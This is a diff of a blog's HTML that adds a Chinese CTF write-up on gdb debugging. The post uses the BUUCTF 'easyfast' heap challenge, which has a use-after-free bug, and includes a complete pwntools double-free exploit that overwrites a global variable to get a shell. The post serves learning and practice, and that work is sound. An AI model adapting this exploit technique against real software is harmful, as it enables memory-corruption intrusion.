@@ -214,6 +214,159 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/12/gdb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tou.jpg">
+      <meta itemprop="name" content="rjc">
+      <meta itemprop="description" content="pangpangpang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mvegetable'blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/11/12/gdb/" class="post-title-link" itemprop="url">gdb新的理解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-12 17:30:00" itemprop="dateCreated datePublished" datetime="2025-11-12T17:30:00+08:00">2025-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-11-13 00:00:55" itemprop="dateModified" datetime="2025-11-13T00:00:55+08:00">2025-11-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="gdb新的理解"><a href="#gdb新的理解" class="headerlink" title="gdb新的理解"></a>gdb新的理解</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>其实感觉之前一直有gdb调试恐惧症。</p>
+<p>但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。</p>
+<p>之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。</p>
+<p>通过最近的联系理解了断点的重要性，以及一些新的gdb指令。</p>
+<p>希望可以一直进步下去！！！</p>
+<p>新学会了用python交互模式进行gdb的单步调试</p>
+<p>下面以一个简单的uaf堆题为例：</p>
+<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="/gdb%5Cgdb1.png" alt="gdb1"></p>
+<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="/image-20251112145102620.png" alt="image-20251112145102620"></p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="/gdb2.png" alt="gdb2"></p>
+<p><img src="/image-20251112145421701.png" alt="image-20251112145421701"></p>
+<p>这里可以看到data段的全局变量<strong>602090</strong>初始的时候是<strong>1</strong></p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="/image-20251112145252356.png" alt="image-20251112145252356"></p>
+<p>这里存在一个 **uaf **漏洞。</p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="/image-20251112145305907.png" alt="image-20251112145305907"></p>
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这里的思路就是利<u>doublefree</u>或者 <u>uaf</u> 将 全局变量<strong>602090</strong>变为0</p>
+<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 环境配置</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># 目标地址（如 GOT 表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;申请堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;填充堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发漏洞函数&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit 流程</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 申请两个 0x50 大小的堆块（0x40 + header）</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 构造 Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 释放 chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># 释放 chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 再次释放 chunk 0，形成 fastbin 链表：0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 控制 fastbin 链表头</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># 指向目标地址 - 0x10（chunk header）</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 重新分配，控制目标地址附近的内存</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 0 位置</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 1 位置，此时其 fd 指向 target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到 target-0x10 附近，可以覆盖目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 覆盖目标内容（如 GOT 表项）</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># 或者 system(&quot;/bin/sh&quot;) 的地址</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 触发漏洞</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="动态调试part1："><a href="#动态调试part1：" class="headerlink" title="动态调试part1："></a><strong>动态调试part1</strong>：</h2><ul>
+<li>首先开启一个<strong>python3</strong> 解释器:</li>
+</ul>
+<p><img src="/image-20251112150609622.png" alt="image-20251112150609622"></p>
+<p>这里同时也可以看到我们启动了一个进程72687</p>
+<ul>
+<li>同时开启另一个<strong>gdb</strong>终端：</li>
+</ul>
+<p><img src="/image-20251112151018331.png" alt="image-20251112151018331"></p>
+<p><code>attach (pid)</code>在gdb里面附件进程。</p>
+<ul>
+<li>设置关键断点：</li>
+</ul>
+<p><img src="/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
+<p><img src="/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
+<p><img src="/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
+<p>在三个关键函数的返回处设置断点</p>
+<p><img src="/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
+<p>然后continue等待解释器输入</p>
+<p><img src="/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
+<ul>
+<li>开始进行单步调试：</li>
+</ul>
+<p><img src="/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
+<p>这里定义函数</p>
+<p>然后下面我们执行了<code>alloc(0x40)</code>创建了0x40大小的堆块</p>
+<p><img src="/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
+<p>这里可以看到右边的终端停在了我们设置的断点</p>
+<p><img src="/image-20251112153558163.png" alt="image-20251112153558163"></p>
+<p>这里也可以看到我们的堆块创建成功。</p>
+<p>这样调试可以看到每步的执行情况。</p>
+<p>每次进入<code>Continuing.</code>等待执行时候在python解释器执行新的指令</p>
+<p><img src="/image-20251112153909048.png" alt="image-20251112153909048"></p>
+<p>这里看到成功把<code>chunk0</code>的<code>fd</code>改为<code>全局变量-0x10</code>,然后后面通过edit就可以修改这个伪造的堆块，也就是我们需要利用全局变量</p>
+<p><img src="/image-20251112154622804.png" alt="image-20251112154622804"></p>
+<p>查看全局变量<code>buf</code></p>
+<p>可以看到我们的目标地址被当作了一个堆块。后面就修改堆块3即可。</p>
+<p><img src="/image-20251112155101849.png" alt="image-20251112155101849"></p>
+<p>这里可以看到我们成功启动了shell的进程：</p>
+<p><img src="/image-20251112155456001.png" alt="image-20251112155456001"></p>
+<p><img src="/image-20251112155433697.png" alt="image-20251112155433697"></p>
+<p><strong>注意</strong>：</p>
+<p><code>ctrl + d </code>退出python解释器</p>
+<p>想看执行情况可以随时<code>ctrl + c</code>暂停gdb终端</p>
+<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="/image-20251112162347772.png" alt="image-20251112162347772"></p>
+<p>这里可以看到我们进入了<code>interactive mode</code></p>
+<p><img src="/image-20251112162428445.png" alt="image-20251112162428445"></p>
+<p><img src="/image-20251112162453383.png" alt="image-20251112162453383"></p>
+<p>继续4执行<code>shell()</code>成功</p>
+<p>同时可以利用<code>interactive mode</code>和<code>gdb.attach()</code></p>
+<p><img src="/image-20251112162721541.png" alt="image-20251112162721541"></p>
+<p><img src="/image-20251112162730716.png" alt="image-20251112162730716"></p>
+<p>这里就是说当写脚本的时候可以利用<code>interactive mode</code> 继续往下执行<code>gdb.attach</code>后面的内容。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -713,20 +866,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
